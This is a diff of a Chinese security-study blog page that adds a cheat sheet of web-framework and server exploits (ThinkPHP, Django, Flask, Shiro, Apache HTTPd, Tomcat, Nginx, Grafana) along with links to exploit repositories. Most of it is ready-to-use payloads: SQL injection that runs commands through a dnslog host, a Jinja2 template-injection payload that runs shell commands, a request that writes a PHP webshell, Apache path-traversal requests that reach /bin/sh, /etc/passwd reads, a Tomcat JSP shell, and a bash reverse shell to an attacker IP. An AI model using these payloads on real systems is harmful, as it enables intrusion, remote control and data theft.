@@ -8,7 +8,7 @@
   
   
   
-  <title>其他漏洞 | JohnScott2046的博客</title>
+  <title>46其他漏洞 | JohnScott2046的博客</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -254,12 +254,12 @@
 
 <div class="post">
   <h1 class="article-title">
-    <span>其他漏洞</span>
+    <span>46其他漏洞</span>
   </h1>
   <div class="article-top-meta">
     <span>
       发布 : 
-      2021-11-11
+      2021-11-19
     </span>
     
       <span>
@@ -281,6 +281,65 @@
   <div class="article-content">
     <div class="markdown-body">
       <p>网络安全(一)其他漏洞</p>
+<h2 id="常见框架RCE总结"><a href="#常见框架RCE总结" class="headerlink" title="常见框架RCE总结"></a>常见框架RCE总结</h2><p>中间件及框架列表：</p>
+<p>IIS，Apache，Nginx，Tomcat，Docker，K8s，Weblogic，JBoos，WebSphere，Jenkins ，GlassFish，Jetty，Jira，Struts2，Laravel，Solr，Shiro，Thinkphp，Spring，Flask，jQuery等</p>
+<p>1、开发框架-PHP-Laravel-Thinkphp</p>
+<p>2、开发框架-Javaweb-St2-Spring</p>
+<p>3、开发框架-Python-django-Flask</p>
+<p>4、开发框架-Javascript-Node.js-JQuery</p>
+<p>5、其他框架-Java-Apache Shiro&amp;Apache Sorl</p>
+<p>常见语言开发框架：</p>
+<p>PHP：Thinkphp Laravel YII CodeIgniter CakePHP Zend等</p>
+<p>JAVA：Spring MyBatis Hibernate Struts2 Springboot等</p>
+<p>Python：Django Flask Bottle Turbobars Tornado Web2py等</p>
+<p>Javascript：Vue.js Node.js Bootstrap JQuery Angular等</p>
+<h3 id="Laravel"><a href="#Laravel" class="headerlink" title="Laravel"></a>Laravel</h3><p>CVE-2021-3129 RCE</p>
+<p>Laravel &lt;= 8.4.2</p>
+<p><a href="https://github.com/zhzyker/CVE-2021-3129">https://github.com/zhzyker/CVE-2021-3129</a></p>
+<p><a href="https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP">https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</a></p>
+<h3 id="Thinkphp-3-X-RCE-5-X-RCE"><a href="#Thinkphp-3-X-RCE-5-X-RCE" class="headerlink" title="Thinkphp-3.X RCE-5.X RCE"></a>Thinkphp-3.X RCE-5.X RCE</h3><p><a href="https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection">https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection</a></p>
+<p><a href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3">https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.3</a></p>
+<h3 id="PHPUnit"><a href="#PHPUnit" class="headerlink" title="PHPUnit"></a>PHPUnit</h3><p>eval-stdin.php 远程命令执行漏洞 CVE-2017-9841</p>
+<p>/phpunit/src/Util/PHP/eval-stdin.php</p>
+<p>POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1<br>Host:<br>Content-Length: 21<br>Accept-Encoding: gzip</p>
+<h3 id="JAVA-Spring-amp-Struts2-amp-Shiro"><a href="#JAVA-Spring-amp-Struts2-amp-Shiro" class="headerlink" title="JAVA Spring&amp;Struts2&amp;Shiro"></a>JAVA Spring&amp;Struts2&amp;Shiro</h3><p>S2-062 CVE-2021-31805</p>
+<p><a href="https://github.com/YanMu2020/s2-062">https://github.com/YanMu2020/s2-062</a></p>
+<h3 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h3><p>SpringBoot 相关漏洞学习资料，利用方法和技巧合集</p>
+<p><a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a></p>
+<p>SpringBoot</p>
+<p><a href="https://github.com/0x727/SpringBootExploit">https://github.com/0x727/SpringBootExploit</a></p>
+<p><a href="https://github.com/WhiteHSBG/JNDIExploit">https://github.com/WhiteHSBG/JNDIExploit</a></p>
+<p>Spring-cloud-function</p>
+<p><a href="https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE">https://github.com/chaosec2021/Spring-cloud-function-SpEL-RCE</a></p>
+<p>Spring_Cloud_Gateway</p>
+<p><a href="https://github.com/An0th3r/CVE-2022-22947-exp">https://github.com/An0th3r/CVE-2022-22947-exp</a></p>
+<h3 id="Apache-Shiro"><a href="#Apache-Shiro" class="headerlink" title="Apache Shiro"></a>Apache Shiro</h3><p>判断：大多会发生在登录处，返回包里包含remeberMe=deleteMe字段</p>
+<p>漏洞：<a target="_blank" rel="noopener" href="https://avd.aliyun.com/search?q=shiro">https://avd.aliyun.com/search?q=shiro</a></p>
+<p>Apache Shiro &lt;= 1.2.4 默认密钥致命令执行漏洞  CVE-2016-4483<br>Apache Shiro &lt; 1.3.2 验证绕过漏洞 CVE-2016-2807<br>Apache Shiro &lt; 1.4.2 cookie oracle padding漏洞 CVE-2019-12442<br>Apache Shiro &lt; 1.5.2 验证绕过漏洞 CVE-2020-1957<br>Apache Shiro &lt; 1.5.3 验证绕过漏洞 CVE-2020-11989<br>Apahce Shiro &lt; 1.6.0 验证绕过漏洞 CVE-2020-13933<br>Apahce Shiro &lt; 1.7.1 权限绕过漏洞 CVE-2020-17523</p>
+<p>CVE_2016_4437 Shiro-550+Shiro-721</p>
+<p>CVE-2020-11989<br>Poc： /admin/%20<br>影响范围：Apache Shiro &lt; 1.7.1<br><a href="https://github.com/jweny/shiro-cve-2020-17523">https://github.com/jweny/shiro-cve-2020-17523</a></p>
+<p>CVE-2020-1957<br>Poc： /xxx/..;/admin/<br>影响范围：Apache Shiro &lt; 1.5.3</p>
+<h3 id="Apache-Solr"><a href="#Apache-Solr" class="headerlink" title="Apache Solr"></a>Apache Solr</h3><p><a href="https://github.com/Imanfeng/Apache-Solr-RCE#cve-2017-12629">https://github.com/Imanfeng/Apache-Solr-RCE#cve-2017-12629</a></p>
+<p>CVE-2019-0193<br>CVE-2019-0192<br>CVE-2019-17558<br>CVE-2017-12629<br>CVE-2019-12409<br>CVE-2020-13957<br>CVE-2018-8026<br>CVE-2021-27905 Apache Solr 文件读取&amp;SSRF</p>
+<p><a href="https://github.com/murataydemir/CVE-2021-27905">https://github.com/murataydemir/CVE-2021-27905</a></p>
+<h3 id="Python-Django-amp-Flask-amp-MotionEye"><a href="#Python-Django-amp-Flask-amp-MotionEye" class="headerlink" title="Python Django&amp;Flask&amp;MotionEye"></a>Python Django&amp;Flask&amp;MotionEye</h3><p>CVE_2019_14234</p>
+<p>单引号已注入成功，SQL语句报错：<br>/admin/vuln/collection/?detail__a%27b=123</p>
+<p>创建cmd_exec：<br>/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcreate%20table%20cmd_exec(cmd_output%20text)–%20</p>
+<p>调用cmd_exec执行命令：<br>/admin/vuln/collection/?detail__title%27)%3d%271%27%20or%201%3d1%20%3bcopy%20cmd_exec%20FROM%20PROGRAM%20%27ping hqrwsz.dnslog.cn%27–%20</p>
+<p>CVE-2020-7471<br><a href="https://github.com/huzaifakhan771/CVE-2020-7471-Django">https://github.com/huzaifakhan771/CVE-2020-7471-Django</a></p>
+<p>CVE-2021-35042<br>目录：<br>/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20@@basedir)),1)%23<br>版本：<br>/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20version())),1)%23</p>
+<p>数据库名：<br>/vuln/?order=vuln_collection.name);select%20updatexml(1,%20concat(0x7e,(select%20database())),1)%23</p>
+<h3 id="Flask-Jinja2-SSTI"><a href="#Flask-Jinja2-SSTI" class="headerlink" title="Flask Jinja2 SSTI"></a>Flask Jinja2 SSTI</h3><p>Flask是一个使用Python编写的轻量级Web应用框架。其WSGI工具箱采用Werkzeug ，模板引擎则使用Jinja2</p>
+<p>?name=%7B%25%20for%20c%20in%20%5B%5D.<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()%20%25%7D%0A%7B%25%20if%20c.<strong>name</strong>%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.<strong>init</strong>.<strong>globals</strong>.values()%20%25%7D%0A%20%20%7B%25%20if%20b.<strong>class</strong>%20%3D%3D%20%7B%7D.<strong>class</strong>%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</p>
+<h3 id="MotionEye"><a href="#MotionEye" class="headerlink" title="MotionEye"></a>MotionEye</h3><p>信息泄露漏洞 CVE-2022-25568</p>
+<p>MotionEye &lt;= 0.42.1</p>
+<p>/config/list</p>
+<h3 id="JavaScript-Jquery-amp-Node"><a href="#JavaScript-Jquery-amp-Node" class="headerlink" title="JavaScript Jquery&amp;Node"></a>JavaScript Jquery&amp;Node</h3><p>jQuery Upload File &lt;= 4.0.2 中的任意文件上传<br>curl -F “myfile=@php.php” “url”</p>
+<p>XSS payload<br><a href="https://github.com/mahp/jQuery-with-XSS">https://github.com/mahp/jQuery-with-XSS</a></p>
+<p>cve_2021_21315<br>Systeminformation &lt;  5.3.1</p>
+<p><a href="https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC">https://github.com/ForbiddenProgrammer/CVE-2021-21315-PoC</a></p>
+<p>POC<br>/api/getServices?name[]=$(echo -e ‘ckcsec’ &gt; test.txt)<br>cve_2017_14849</p>
+<p>GET：<br>/static/../../../a/../../../../etc/passwd</p>
 <h2 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h2><h3 id="一、-thinkphp漏洞"><a href="#一、-thinkphp漏洞" class="headerlink" title="一、 thinkphp漏洞"></a>一、 thinkphp漏洞</h3><p>最早诞生于 2006 年初，2007 年元旦正式更名为 ThinkPHP，并且遵循 Apache2 开源协议发布。ThinkPHP 从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进</p>
 <p>ThinkPHP 能够解决应用开发中的大多数需要，因为其自身包含了底层架构、兼容处理、基类库、数据库访问层、模板引擎、缓存机制、插件机制、角色认证、表单处理等常用的组件，并且对于跨版本、跨平台和跨数据库移植都比较方便。并且每个组件都是精心设计和完善的，应用开发过程仅仅需要关注您的业务逻辑</p>
 <p>ThinkPHP 2.x 任意代码执行漏洞<br>ThinkPHP 3.0 版本因为 Lite 模式下没有修复该漏洞，也存在这个漏洞</p>
@@ -303,7 +362,6 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a &#x3D; &#39;aaa&#39;;</span><br><span class="line">$b &#x3D; preg_replace(&#39;&#x2F;\d&#x2F;e&#39;, &quot;print(&#39;hello world!&#39;);&quot;, $a);</span><br><span class="line"></span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$arr &#x3D; array();</span><br><span class="line">$str &#x3D; &#39;a&#x2F;b&#x2F;c&#x2F;d&#x2F;e&#x2F;f&#x2F;g&#39;;</span><br><span class="line"></span><br><span class="line">preg_replace(&quot;&#x2F;(\w+)\&#x2F;([^\&#x2F;])&#x2F;e&quot;, &#39;$arr[&quot;\1&quot;]&#x3D;&quot;\2&quot;&#39;, $str);</span><br><span class="line">print_r($arr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[</span><br><span class="line">  &#39;a&#39; &#x3D;&gt; &#39;b&#39;,</span><br><span class="line">  &#39;c&#39; &#x3D;&gt; &#39;d&#39;,</span><br><span class="line">  &#39;e&#39; &#x3D;&gt; &#39;f&#39;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-
 
 
 <h4 id="環境搭建"><a href="#環境搭建" class="headerlink" title="環境搭建"></a>環境搭建</h4><p>cd vulhub/thinkphp/2-rce<br>docker-compose up -d<br>docker ps -a</p>
@@ -346,6 +404,112 @@
 <p>&amp;_(new+java.lang.ProcessBuilder(“bash”,”-c”,”bash+-i+&gt;%26+/dev/tcp/攻击机IP/端口号+0&gt;%261”)).start()=vulhub</p>
 <p>ProcessBuilder 类是 J2SE 1.5 在 java.lang 中新添加的一个新类，此类用于创建操作系统进程，它提供一种启动和管理进程（也就是应用程序）的方法。在 J2SE 1.5 之前，都是由 Process 类处来实现进程的控制管理。</p>
 <p>每个 ProcessBuilder 实例管理一个进程属性集。它的 start() 方法利用这些属性创建一个新的 Process实例。start() 方法可以从同一实例重复调用</p>
+<h3 id="六、-ThinkPHP5-RCE-GetSHELL"><a href="#六、-ThinkPHP5-RCE-GetSHELL" class="headerlink" title="六、 ThinkPHP5-RCE-GetSHELL"></a>六、 ThinkPHP5-RCE-GetSHELL</h3><p><a target="_blank" rel="noopener" href="http://192.168.1.230/public/index.php?s=index/think%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=whoami">http://192.168.1.230/public/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</a></p>
+<p>写入一句话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.2.230&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;echo ^&lt;?php @eval($_GET[&quot;code&quot;]);?^&gt;&gt;shell.php</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="七、-svn文件泄露漏洞"><a href="#七、-svn文件泄露漏洞" class="headerlink" title="七、 svn文件泄露漏洞"></a>七、 svn文件泄露漏洞</h3><p>下载地址 <a href="https://github.com/admintony/svnExploit">https://github.com/admintony/svnExploit</a></p>
+<ol>
+<li>扫描</li>
+</ol>
+<p>python SvnExploit.py -u http://站点地址/.svn</p>
+<ol start="2">
+<li>下载目标源码</li>
+</ol>
+<p>python SvnExploit.py -u http://站点地址/.svn –dump</p>
+<ol start="3">
+<li>查看数据库</li>
+</ol>
+<p>sqlitebrowser database.db</p>
+<h3 id="八、-thinkphp3-2日志泄露漏洞-版本过旧"><a href="#八、-thinkphp3-2日志泄露漏洞-版本过旧" class="headerlink" title="八、 thinkphp3.2日志泄露漏洞(版本过旧)"></a>八、 thinkphp3.2日志泄露漏洞(版本过旧)</h3><p>THINKPHP3.2结构：Application\Runtime\Logs\Home\16_01_01.log<br>THINKPHP3.1结构：Runtime\Logs\Home\11_01_01.log</p>
+<p>这个版本的thinkphp的错误日志里会显示出数据库的sql执行信息，而数据库密码、网站后台登陆密码，日志是有可能会记录下来的，优先从最新的日志来查找数据</p>
+<p>后台查找</p>
+<ol>
+<li><p>目录查找，一般的目录是 /admin，/login …</p>
+</li>
+<li><p>子域名查找，admin.test.cn，user.test.cn …</p>
+</li>
+<li><p>Host碰撞子域名，这种不常见，适用于内部系统（或者靶场、CTF）</p>
+</li>
+</ol>
+<p>Host_Ip碰撞工具 <a href="https://github.com/fofapro/Hosts_scan">https://github.com/fofapro/Hosts_scan</a></p>
+<ol>
+<li><p>host.txt里填写的是要碰撞的子域名： webhack123.com，admin… 可以自行添加字典！</p>
+</li>
+<li><p>ip.txt里填写的是目标的ip： 192.168.1.230</p>
+</li>
+<li><p>python IP_hosts_scan_multithreading.py</p>
+</li>
+<li><p>vim /etc/hosts<br>加入 目标ip 目标域名</p>
+</li>
+<li><p>修改 test.py 中的域名<br>python3 tp.py</p>
+</li>
+<li><p>查看日志 获取账号相关的日志</p>
+</li>
+</ol>
+<h3 id="九、-Nginx整数溢出漏洞-CVE-2017-7529"><a href="#九、-Nginx整数溢出漏洞-CVE-2017-7529" class="headerlink" title="九、 Nginx整数溢出漏洞 CVE-2017-7529"></a>九、 Nginx整数溢出漏洞 CVE-2017-7529</h3><ol>
+<li>访问缓存文件拿到 Content-Length，以 /proxy/demo.png 为例：</li>
+</ol>
+<p>curl -I <a target="_blank" rel="noopener" href="http://127.0.0.1/proxy/demo.png">http://127.0.0.1/proxy/demo.png</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.13.1</span><br><span class="line">Date: Wed, 12 Jul 2017 15:57:57 GMT</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line">Content-Length: 16585</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Last-Modified: Wed, 12 Jul 2017 15:57:57 GMT</span><br><span class="line">ETag: W&#x2F;&quot;40c9-5543e4fad0d40&quot;</span><br><span class="line">X-Proxy-Cache:: MISS</span><br><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure>
+
+<p>看到 Content-Length: 16585, 找个比这个数大的值</p>
+<p>例如 17208, 第二个 range 值为 0x8000000000000000-17208, 也就是 9223372036854758600</p>
+<ol start="2">
+<li>请求时设置 range 如下</li>
+</ol>
+<p>curl -i <a target="_blank" rel="noopener" href="http://127.0.0.1/proxy/demo.png">http://127.0.0.1/proxy/demo.png</a> -r -17208,-9223372036854758600</p>
+<h3 id="十、-tomcat弱口令"><a href="#十、-tomcat弱口令" class="headerlink" title="十、 tomcat弱口令"></a>十、 tomcat弱口令</h3><p>用户名 tomcat  密码 tomcat</p>
+<h3 id="十一、-tomcat任意文件写入"><a href="#十一、-tomcat任意文件写入" class="headerlink" title="十一、 tomcat任意文件写入"></a>十一、 tomcat任意文件写入</h3><ol>
+<li>使用python执行exp，密码是pwd</li>
+</ol>
+<p>python CVE_2017_12615_EXP.py <a target="_blank" rel="noopener" href="http://106.15.50.112:18082/">http://106.15.50.112:18082</a></p>
+<ol start="2">
+<li>上传成功后，会返回一个地址</li>
+</ol>
+<p>shell: <a target="_blank" rel="noopener" href="http://106.15.50.112:18082/201712615.jsp">http://106.15.50.112:18082/201712615.jsp</a></p>
+<ol start="3">
+<li>浏览器执行命令，查看当前目录</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="http://106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=ls">http://106.15.50.112:18082/201712615.jsp?pwd=fff&amp;cmd=ls</a> -R</p>
+<h3 id="十二、-Apache-2-4-49-CVE-2021-41773-、-2-4-50-CVE-2021-42013"><a href="#十二、-Apache-2-4-49-CVE-2021-41773-、-2-4-50-CVE-2021-42013" class="headerlink" title="十二、 Apache 2.4.49 (CVE-2021-41773) 、 2.4.50 (CVE-2021-42013)"></a>十二、 Apache 2.4.49 (CVE-2021-41773) 、 2.4.50 (CVE-2021-42013)</h3><p>Apache HTTPd是Apache基金会开源的一款流行的HTTP服务器。2021年10月8日Apache HTTPd官方发布安全更新，披露了CVE-2021-42013 Apache HTTPd 2.4.49/2.4.50 路径穿越漏洞。</p>
+<p>由于对CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越漏洞的修复不完善，攻击者可构造恶意请求绕过补丁，利用穿越漏洞读取到Web目录之外的其他文件。同时若Apache HTTPd开启了cgi支持，攻击者可构造恶意请求执行命令，控制服务器。</p>
+<p>影响版本<br>Apache HTTPd 2.4.49/2.4.50版本</p>
+<p>GET数据包<br>GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1<br>Host: host<br>Content-Length: 2<br>Apache HTTPd 2.4.49 命令执行测试，未能成功回显命令，回显了bash报错信息。</p>
+<p>POST数据包<br>POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1<br>Host: host<br>Connection: close<br>Content-Length: 13</p>
+<p>echo;ifconfig</p>
+<p>POST /cgi-bin/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/%2e%%32%65/bin/sh HTTP/1.1<br>Host: host<br>Connection: close<br>Content-Length: 13</p>
+<p>echo;ifconfig</p>
+<p>Apache HTTPd 2.4.50 命令执行测试<br>POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1<br>Host: host<br>Connection: close<br>Content-Length: 13</p>
+<p>echo;ifconfig</p>
+<p>檢測工具 <a href="https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013">https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013</a></p>
+<h3 id="Grafana文件读取漏洞（CVE-2021-43798）"><a href="#Grafana文件读取漏洞（CVE-2021-43798）" class="headerlink" title="Grafana文件读取漏洞（CVE-2021-43798）"></a>Grafana文件读取漏洞（CVE-2021-43798）</h3><p>Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。2021年12月6日，国外安全研究人员披露Grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件。</p>
+<p>影响版本 Grafana 8.x 系列</p>
+<p>fofa资产确定 app=”grafana”</p>
+<p>檢測腳本 <a href="https://github.com/j-jasson/CVE-2021-43798-grafana_fileread">https://github.com/j-jasson/CVE-2021-43798-grafana_fileread</a></p>
+<p>对URL进行检测<br>python3 grafana_fileread.py -u <a target="_blank" rel="noopener" href="http://localhost:3000/">http://localhost:3000</a></p>
+<p>查看帮助<br>python3 grafana_fileread.py-h  </p>
+<p>修复方案<br>v8.0.0-beta1 和 v8.3.0 之间的所有安装都应尽快升级。如果无法升级，在 Grafana 前运行反向代理来规范化请求的 PATH 将缓解该漏洞。例如，envoy 中的normalize_path设置。</p>
+<h3 id="Apache-APISIX-未授权访问（CVE-2021-45232）"><a href="#Apache-APISIX-未授权访问（CVE-2021-45232）" class="headerlink" title="Apache APISIX 未授权访问（CVE-2021-45232）"></a>Apache APISIX 未授权访问（CVE-2021-45232）</h3><p>Apache APISIX 是一个动态、实时、高性能的 API 网关， 提供负载均衡、动态上游、灰度发布、服务熔断、身份认证、可观测性等丰富的流量管理功能。Apache APISIX Dashboard 使用户可通过前端界面操作 Apache APISIX。</p>
+<p>该漏洞的存在是由于 Manager API 中的错误。Manager API 在 gin 框架的基础上引入了 droplet 框架，所有的 API 和鉴权中间件都是基于 droplet 框架开发的。但是有些 API 直接使用了框架 gin 的接口，从而绕过身份验证。</p>
+<p>影响版本 Apache APISIX Dashboard &lt; 2.10.1</p>
+<p>资产确定 title=”Apache APISIX Dashboard”</p>
+<p>poc   host + /apisix/admin/migrate/export</p>
+<p><a href="https://github.com/Ifory885/CVE-2021-45232">https://github.com/Ifory885/CVE-2021-45232</a></p>
+<p>修复方案 目前官方已发布修复版本修复了该漏洞，升级到安全版本：<br><a href="https://github.com/apache/apisix-dashboard/releases/tag/v2.10.1">https://github.com/apache/apisix-dashboard/releases/tag/v2.10.1</a><br>若无法及时升级的用户，可根据官方提供的修复建议通过修改默认用户名和密码，并设置访问Apache APISIX Dashboard的白名单进行缓解。</p>
+<h3 id="宝塔IIS中间件解析漏洞"><a href="#宝塔IIS中间件解析漏洞" class="headerlink" title="宝塔IIS中间件解析漏洞"></a>宝塔IIS中间件解析漏洞</h3><p>适用范围： 宝塔Windows &lt;= 6.5 或 liunx装有IIS8.5版本</p>
+<p>写一个php文件  另存为jpg格式</p>
+<p>然後直接上傳文件 1.jpg 后面加/.php </p>
+<p>如果可以解析PHP文件 说明存在这个漏洞</p>
+<h3 id="Nginx整数溢出漏洞"><a href="#Nginx整数溢出漏洞" class="headerlink" title="Nginx整数溢出漏洞"></a>Nginx整数溢出漏洞</h3><p>CVE-2017-7529</p>
+<p>访问缓存文件拿到 Content-Length，以 /proxy/demo.png 为例</p>
+<p>curl -I <a target="_blank" rel="noopener" href="http://127.0.0.1/proxy/demo.png">http://127.0.0.1/proxy/demo.png</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.13.1</span><br><span class="line">Date: Tue, 15 Feb 2022 10:44:32 GMT</span><br><span class="line">Content-Type: image&#x2F;png</span><br><span class="line">Content-Length: 16585</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Last-Modified: Thu, 14 Mar 2019 02:48:10 GMT</span><br><span class="line">ETag: &quot;40c9-58404f3e28e80&quot;</span><br><span class="line">X-Proxy-Cache: MISS</span><br><span class="line">Accept-Ranges: bytes</span><br></pre></td></tr></table></figure>
+
+
+<p>Content-Length:   第一个 16585，第二个 range 值为 0x8000000000000000-17208, 也就是 9223372036854758600</p>
+<p>请求时设置range<br>curl -i <a target="_blank" rel="noopener" href="http://127.0.0.1/proxy/demo.png">http://127.0.0.1/proxy/demo.png</a> -r -17208,-9223372036854758600 &gt; 1.txt</p>
 
     </div>
   </div>
@@ -449,13 +613,13 @@
       <div class="nav-pre">
         <i class="iconfont icon-prev"></i>
         上一篇:
-        <a href="/2021/45%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_self">反序列化漏洞</a>
+        <a href="/2021/45%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_self">45反序列化漏洞</a>
       </div>
     
     
       <div class="nav-next">
         下一篇:
-        <a href="/2021/47%E5%AF%86%E7%A0%81%E5%AD%A6/" target="_self">密码学</a>
+        <a href="/2021/shell/" target="_self">shell</a>
         <i class="iconfont icon-next"></i>
       </div>
     
